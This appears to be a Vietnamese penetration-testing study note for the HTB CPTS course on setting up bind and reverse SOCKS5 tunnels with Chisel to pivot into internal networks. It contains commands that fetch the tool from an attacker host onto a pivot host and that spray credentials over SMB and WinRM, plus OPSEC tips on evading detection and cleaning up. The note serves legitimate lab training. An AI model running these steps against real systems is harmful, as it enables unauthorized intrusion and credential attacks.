---
title: "SOCKS5 Tunneling with Chisel"
date: 2026-04-25 09:21:48 +0700
categories: [HTB_CPTS, Pivot]
tags: [pivoting, chisel, socks5, tunneling]
description: "HTB CPTS note về SOCKS5 tunneling bằng Chisel để pivot qua mạng nội bộ."
pin: false
---
tags:

- pivoting
- tunneling
- chisel
- socks5
- proxychains
- CPTS created: 2025-04-25

---
---
# Pivoting — Chisel SOCKS Tunnel

---
## Bind Tunnel

### Cơ chế hoạt động

```
Pivot Host (Chisel Server) ────► Attack Host (Chisel Client)
        :1080 SOCKS5 kết nối vào trong
                    ↓
        Proxychains → Internal Network
```

> **Khi nào dùng Bind? Dùng khi pivot host **cho phép inbound connection** — attack host kết nối vào Chisel server chạy trên pivot host.**

### Setup

#### 1. Transfer Chisel lên Pivot Host

```bash
# Attack host serve file
python3 -m http.server 8888

# Hoặc SCP thẳng
scp chisel user@<PIVOT_IP>:~/

# Pivot host download
wget http://<ATTACK_IP>:8888/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

#### 2. Pivot Host — Chisel Server

```bash
/tmp/chisel server -v -p 8080 --socks5
# Listen :8080, chờ attack host kết nối vào
```

#### 3. Attack Host — Chisel Client

```bash
chisel client -v <PIVOT_IP>:8080 socks
# SOCKS5 proxy mở tại 127.0.0.1:1080
```

#### 4. Proxychains Config

```bash
# /etc/proxychains4.conf
dynamic_chain          # đổi từ strict_chain
# proxy_dns            # comment ra nếu DNS lookup gây lỗi
tcp_connect_time_out 3000
tcp_read_time_out 15000

[ProxyList]
socks5 127.0.0.1 1080
```

### Verify Tunnel

```bash
proxychains curl -s http://<INTERNAL_IP>
proxychains curl -s http://172.16.5.1
```

> **Confirm tunnel live trước, đừng scan ngay — tránh mất thời gian debug nhầm target down.**

---
## Reverse Tunnel

### Cơ chế hoạt động

```
Attack Host (Chisel Server) ◄──── Pivot Host (Chisel Client)
        :1080 SOCKS5 kết nối ngược ra ngoài
                    ↓
        Proxychains → Internal Network
```

> **Khi nào dùng Reverse? Client chủ động kết nối ra ngoài → bypass inbound firewall rule trên pivot host.**

### Setup

#### 1. Attack Host — Chisel Server

```bash
sudo chisel server --reverse -v -p 8080 --socks5
# Listen :8080, mở SOCKS5 tại 127.0.0.1:1080
```

#### 2. Transfer Chisel lên Pivot Host

```bash
# Attack host serve file
python3 -m http.server 8888

# Hoặc SCP thẳng
scp chisel user@<PIVOT_IP>:~/

# Pivot host download
wget http://<ATTACK_IP>:8888/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

#### 3. Pivot Host — Chisel Client

```bash
/tmp/chisel client <ATTACK_IP>:8080 R:127.0.0.1:1080:socks
# Thấy "client: Connected" → tunnel sẵn sàng
```

#### 4. Proxychains Config

```bash
# /etc/proxychains4.conf
dynamic_chain          # đổi từ strict_chain
# proxy_dns            # comment ra nếu DNS lookup gây lỗi
tcp_connect_time_out 3000
tcp_read_time_out 15000

[ProxyList]
socks5 127.0.0.1 1080
```

### Verify Tunnel

```bash
proxychains curl -s http://<INTERNAL_IP>
proxychains curl -s http://172.16.5.1
```

> **Confirm tunnel live trước, đừng scan ngay — tránh mất thời gian debug nhầm target down.**

---
## Sử dụng (Chung cho cả 2 mode)

```bash
# Host discovery
proxychains nxc smb <INTERNAL_SUBNET>/24

# Scan port — bắt buộc -sT, không dùng -sS qua SOCKS
proxychains nmap -sT -Pn -n --open -p 445,5985,3389,3306 <TARGET>

# Spray credential
proxychains nxc smb <TARGET> -u <USER> -p <PASS>
proxychains nxc winrm <TARGET> -u <USER> -p <PASS>
```

### Specific Port Forward

> Dùng khi chỉ cần reach 1 service cụ thể — ít overhead hơn SOCKS.

```bash
# Bind — pivot host là server:
/tmp/chisel server -v -p 8080

# Attack host forward:
chisel client <PIVOT_IP>:8080 3306:<INTERNAL_TARGET>:3306

# Reverse — pivot host là client:
/tmp/chisel client <ATTACK_IP>:8080 R:3306:172.16.5.19:3306

# Attack host dùng thẳng:
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---
## Cleanup

```bash
kill $(pgrep chisel)
rm /tmp/chisel
```

---
## Lưu ý

> **Common Mistakes**
>
> - Proxychains phải trỏ về `socks5 127.0.0.1 1080` — **không phải 9050** (đó là port Tor).
> - Nmap qua proxy phải dùng `-sT` TCP connect scan — **không dùng `-sS`** SYN scan.
> - Reverse: SOCKS bind listener ở phía **Attack Host**, không phải Pivot Host.

> **Best Practices**
>
> - Dùng cú pháp rõ ràng: `R:127.0.0.1:1080:socks` cho reverse.
> - Thêm `-Pn -n` khi scan qua SOCKS để tránh lỗi host discovery và DNS.
> - Scan nguyên `/24` qua SOCKS chậm — ưu tiên scan port trọng điểm trước.
> - `dynamic_chain` tốt hơn `strict_chain` — tránh fail toàn bộ khi một proxy lỗi.

> **Compatibility**
>
> - Chisel binary phải đúng OS/architecture, ví dụ `linux_amd64` cho Linux pivot host.
> - Nếu binary lỗi trên target, có thể do `glibc` mismatch → thử Chisel release khác.
> - Version client/server khác nhau thường vẫn hoạt động, nhưng nếu lỗi nên thử cùng version.

> **OPSEC**
>
> - Chisel dùng WebSocket over HTTP — traffic trông như HTTP bình thường nhưng một số IDS vẫn detect được pattern này qua WS upgrade signature.
> - Cleanup sau khi xong — xóa binary, kill process.
